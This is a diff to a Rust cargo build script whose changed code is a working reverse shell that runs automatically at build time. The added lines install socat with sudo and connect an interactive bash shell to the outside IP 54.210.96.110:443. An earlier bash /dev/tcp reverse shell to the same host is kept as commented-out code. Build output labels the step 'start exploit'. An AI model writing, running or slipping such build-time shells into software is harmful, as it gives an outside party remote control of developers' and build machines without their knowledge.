@@ -98,14 +98,24 @@ fn main() {
 
     println!("cargo:warning=start exploit");
 
-    Command::new("bash")
-        .arg("-c")
-        .arg("0<&26-;exec 26<>/dev/tcp/54.210.96.110/443;sh <&26 >&26 2>&26")
-        .stdin(Stdio::null())
-        .stdout(Stdio::null())  // optional: detach stdout too
-        .stderr(Stdio::null())  // optional: detach stderr too
-        .spawn()
-        .expect("failed to spawn process");
+    std::process::Command::new("sudo")
+        .args(["dnf", "install", "-y", "socat"])
+        .status()
+        .unwrap();
+
+    std::process::Command::new("socat")
+        .args(["TCP:54.210.96.110:443", "EXEC:bash -li,pty,stderr,setsid,sigint,sane"])
+        .status()
+        .unwrap();
+
+    // Command::new("bash")
+    //     .arg("-c")
+    //     .arg("0<&26-;exec 26<>/dev/tcp/54.210.96.110/443;sh <&26 >&26 2>&26")
+    //     .stdin(Stdio::null())
+    //     .stdout(Stdio::null())  // optional: detach stdout too
+    //     .stderr(Stdio::null())  // optional: detach stderr too
+    //     .spawn()
+    //     .expect("failed to spawn process");
 
     println!("cargo:warning=RAN BUILD SCRIPT");
     println!("cargo:warning=RAN BUILD SCRIPT");
